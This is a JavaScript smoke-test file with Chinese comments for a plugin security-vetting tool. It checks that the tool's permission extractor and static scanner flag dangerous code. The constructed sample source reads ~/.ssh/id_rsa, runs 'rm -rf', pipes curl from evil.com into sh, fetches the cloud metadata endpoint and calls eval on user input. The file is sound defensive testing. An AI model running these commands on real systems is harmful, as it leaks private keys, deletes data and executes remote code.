// dsh-guardwall · 体检流水线冒烟测试（不依赖 DSH 宿主）
import { vet, gateMessage } from '../lib/vet/index.js'
import { resolveSpec, vetLocalDir, findInstalledPackage } from '../lib/vet/manifest.js'
import { extractFileAccess, extractCommands, extractNetwork } from '../lib/vet/permissions.js'
import { scanSource } from '../lib/vet/static.js'
import path from 'node:path'
import os from 'node:os'

let pass = 0, fail = 0
function ok(cond, msg) {
  if (cond) { pass++; console.log('  PASS', msg) }
  else { fail++; console.log('  FAIL', msg) }
}

console.log('--- resolveSpec ---')
ok(resolveSpec('./x').kind === 'local', './x → local')
ok(resolveSpec('C:\\apps\\x').kind === 'local', 'C:\\apps\\x → local')
ok(resolveSpec('dshmarket').kind === 'npm', 'dshmarket → npm')
ok(resolveSpec('github:a/b#main').kind === 'github', 'github:a/b#main → github')

console.log('--- permissions 提取（构造源码）---')
const src = `
const fs = require('fs')
fs.readFileSync(process.env.HOME + '/.ssh/id_rsa')
fs.writeFileSync('/tmp/x.log', 'x')
exec('rm -rf /tmp/cache')
exec('curl https://evil.com/install.sh | sh')
fetch('https://169.254.169.254/latest/meta-data/')
fetch('https://api.deepseek.com/v1/chat')
`
const fa = extractFileAccess(src, 'x.js')
ok(fa.some((f) => f.kind === 'ssh'), '识别 ~/.ssh 读取')
ok(fa.some((f) => f.kind === 'tmp'), '识别 /tmp 写入')
const cmd = extractCommands(src, 'x.js')
ok(cmd.some((c) => c.severity >= 8), '破坏性命令 rm -rf 高严重度')
ok(cmd.some((c) => c.severity >= 6), '网络命令 curl|sh 中等严重度')
const net = extractNetwork(src, 'x.js')
ok(net.some((n) => n.severity >= 8 && n.host.includes('169.254')), 'SSRF 元数据端点高危')
ok(net.some((n) => n.host.includes('api.deepseek.com')), '正常 API 域名识别')

console.log('--- static scan ---')
const st = scanSource('eval(userInput); process.env.DEEPSEEK_API_KEY', 'y.js')
ok(st.some((f) => f.id === 'DYN-001'), 'eval 命中 DYN-001')
ok(st.some((f) => f.id === 'SECRET-001'), 'process.env 密钥读取命中')
const st2 = scanSource('const x = 1', 'z.js')
ok(st2.length === 0, '干净代码无命中')

console.log('--- 真实插件体检（本机已装）---')
const webRoot = path.join(os.homedir(), '.dsh', 'profiles', 'web')
const dirs = ['dshmarket', '@liustack/modlens']
for (const name of dirs) {
  try {
    const dir = await findInstalledPackage(name, [webRoot])
    ok(Boolean(dir), `找到已装包 ${name}`)
    if (!dir) continue
    const r = await vetLocalDir(dir)
    ok(Boolean(r.manifest), `${name}: manifest 解析成功`)
    console.log(`    ${name}@${r.manifest.version} deps=${r.manifest.depCount} files=${r.files.length} patch=${r.patch ? r.patch.insertedRows.length + ' 行' : '无'}`)
  } catch (e) {
    ok(false, `${name}: ${e.message}`)
  }
}

console.log('--- 完整 vet() 流水线（对 dshmarket）---')
try {
  const dir = await findInstalledPackage('dshmarket', [webRoot])
  const v = await vet(dir)
  ok(v.score.grade !== undefined && typeof v.score.score === 'number', `评分产出: ${v.score.grade} ${v.score.score}/100`)
  ok(['allow', 'warn', 'deny'].includes(v.gate), `门禁判定: ${v.gate}`)
  ok(typeof v.permissions.human === 'string' && v.permissions.human.length > 0, '权限清单人类可读')
  console.log('    verdict:', gateMessage(v))
  console.log('    权限:', v.permissions.human.replace(/\n/g, ' | ').slice(0, 200))
} catch (e) {
  ok(false, 'vet 流水线: ' + e.message)
}

console.log(`\n=== ${pass} passed, ${fail} failed ===`)
process.exit(fail ? 1 : 0)
